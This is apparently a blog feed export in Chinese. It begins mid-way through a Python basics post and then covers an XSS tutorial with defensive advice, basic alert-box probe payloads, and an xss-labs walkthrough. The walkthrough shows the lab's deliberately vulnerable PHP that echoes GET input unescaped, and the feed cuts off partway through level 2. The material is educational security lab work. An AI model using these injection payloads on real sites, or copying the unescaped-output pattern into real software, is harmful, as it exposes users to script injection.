operator\">></span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token string\">'b'</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"b\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token string\">'c'</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">del</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">del</span>有两种用法，一种是<span class=\"token keyword\">del</span>加空格，另一种是<span class=\"token keyword\">del</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">del</span> a</pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>NameError<span class=\"token punctuation\">:</span> name <span class=\"token string\">'a'</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> defined</pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">del</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">del</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>NameError<span class=\"token punctuation\">:</span> name <span class=\"token string\">'a'</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> defined</pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>多维列表<span class=\"token operator\">/</span>元祖访问的示例</pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>IndexError<span class=\"token punctuation\">:</span> <span class=\"token builtin\">tuple</span> index out of <span class=\"token builtin\">range</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>IndexError<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span> index out of <span class=\"token builtin\">range</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple2 <span class=\"token operator\">=</span> tuple1<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple2</pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> tuple2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>TypeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'int'</span> <span class=\"token builtin\">object</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> subscriptable</pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/xss%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/xss%E6%BC%8F%E6%B4%9E/",
            "title": "xss漏洞",
            "date_published": "2023-11-01T00:00:22.000Z",
            "content_html": "<h3 id=\"xss-漏洞介绍\"><a class=\"markdownIt-Anchor\" href=\"#xss-漏洞介绍\">#</a> <span class=\"label info\">💭xss 漏洞介绍</span></h3>\n<p>跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的网络安全漏洞，它允许攻击者将恶意脚本注入到网页中，这些脚本然后被浏览器执行，从而使攻击者能够窃取用户的信息、劫持会话、破坏网站的功能或以其他方式危害用户和网站的安全性。XSS 攻击通常通过在网页中插入恶意代码来实现，而这些代码会在用户浏览网页时执行。</p>\n<h3 id=\"️xss-漏洞通常分为三个主要类型\"><a class=\"markdownIt-Anchor\" href=\"#️xss-漏洞通常分为三个主要类型\">#</a> <span class=\"label primary\">🕷️XSS 漏洞通常分为三个主要类型</span></h3>\n<p>存储型 XSS（Stored XSS）： 攻击者将恶意脚本存储在服务器上的数据库或文件中，然后当用户访问包含这些恶意脚本的页面时，浏览器会加载并执行这些脚本。这可能导致用户的敏感信息被盗取，或者对网站的内容进行篡改。</p>\n<p>反射型 XSS（Reflected XSS）： 攻击者将恶意脚本包含在 URL 中，然后诱使用户点击这个 URL。当用户点击链接时，恶意脚本会被注入到页面中并立即执行。这种类型的攻击通常需要社会工程或诱导用户点击恶意链接。</p>\n<p>DOM-based XSS： 这种类型的攻击不依赖于服务器将恶意脚本存储或反射到页面上。相反，攻击利用了文档对象模型（DOM）在浏览器中的操作方式，通过修改页面的 DOM 结构来执行恶意操作。这种攻击通常难以检测和防御。</p>\n<h3 id=\"危害\"><a class=\"markdownIt-Anchor\" href=\"#危害\">#</a> <span class=\"label danger\">💔危害</span></h3>\n<ul>\n<li>窃取用户的敏感信息，如用户名、密码、cookie 等。</li>\n<li>劫持用户会话，使攻击者能够以用户身份执行操作。</li>\n<li>修改网页内容，包括插入恶意链接或欺骗用户。</li>\n<li>利用网站的信任来进行社会工程攻击。</li>\n</ul>\n<div class=\"note info\">\n<p>要防止 XSS 攻击，开发人员和网站管理员可以采取以下措施：</p>\n</div>\n<ol>\n<li><ins class=\"dot\">输入验证和过滤： 对用户输入的数据进行验证和过滤，以确保不允许任何恶意代码通过。</ins></li>\n<li><ins class=\"dot\">输出编码： 在将用户输入的数据输出到网页时，使用适当的编码方法，如 HTML 编码、JavaScript 编码，以防止浏览器解释为可执行代码。</ins></li>\n<li><ins class=\"dot\">HTTP 头部设置： 在 HTTP 响应中设置适当的安全头部，如 Content Security Policy（CSP）来限制浏览器加载外部资源。</ins></li>\n<li><ins class=\"dot\">使用安全框架： 使用安全框架和库，如 OWASP AntiSamy 或 DOMPurify，来帮助防御 XSS 攻击。</ins></li>\n<li><ins class=\"dot\">及时更新： 及时更新网站的软件、库和依赖项，以修复已知的漏洞。</ins></li>\n</ol>\n<p>挖掘 xss 语句时可以用 &lt;&gt;'&quot; 空格这些标签查看页面源代码看看有没有过滤</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>svg onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">'javascript:alert(1)'</span><span class=\"token operator\">></span>aa<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"xss-labs演示\"><a class=\"markdownIt-Anchor\" href=\"#xss-labs演示\">#</a> <span class=\"label success\">🐸xss-labs 演示</span></h3>\n<h4 id=\"第一关\"><a class=\"markdownIt-Anchor\" href=\"#第一关\">#</a> <span class=\"label\">第一关</span></h4>\n<p>输入的会被插入到 h2 标签里并且没有任何过滤</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/1.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/2.png\" alt=\"\"></p>\n<p><span class=\"label\">👁️代码分析</span></p>\n<p>源码分析：下面的代码，str 获取 name 的值，直接返回前端使用。说明源码是完全没有对 GET 请求到的 name 变量进行过滤，原封不动地发送到浏览器的，所以才会被执行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level2.php?keyword=test\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token constant\">GET</span>获取用户输入内容给str</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 align=center>欢迎用户\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$str</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h2>\"</span><span class=\"token punctuation\">;</span> 直接<span class=\"token keyword\">echo</span>输出h2标签里使用没有任何过滤</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>level1.png</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3 align=center>payload的长度:\"</span><span class=\"token operator\">.</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h3>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    payload:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">33333</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/3.png\" alt=\"\"></p>\n<h4 id=\"第二关\"><a class=\"markdownIt-Anchor\" href=\"#第二关\">#</a> <span class=\"label\">第二关</span></h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/xss/4.png\" alt=\"\"></p>\n<p><span class=\"label\">👁️代码分析</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>这关用到了 htmlspecialchars() 函数 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>预定义的字符是:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> &amp;（和号）成为<span class=\"token entity named-entity\" title=\"&amp;\">&amp;amp;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> \"（双引号）成为 <span class=\"token entity named-entity\" title=\"&quot;\">&amp;quot;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> '（单引号）成为 <span class=\"token entity named-entity\" title=\"&apos;\">&amp;apos;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> &lt; （小于）成为 <span class=\"token entity named-entity\" title=\"&lt;\">&amp;lt;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> >（大于）成为 <span class=\"token entity named-entity\" title=\"&gt;\">&amp;gt;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!--STATUS OK--></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html;charset=utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>window<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">alert</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span>     </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"完成的不错！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"level3.php?writing=wait\"</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>欢迎来到level2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>center</span><span class=\"token punctuation\">></span></span>欢迎来到level2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"keyword\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h2 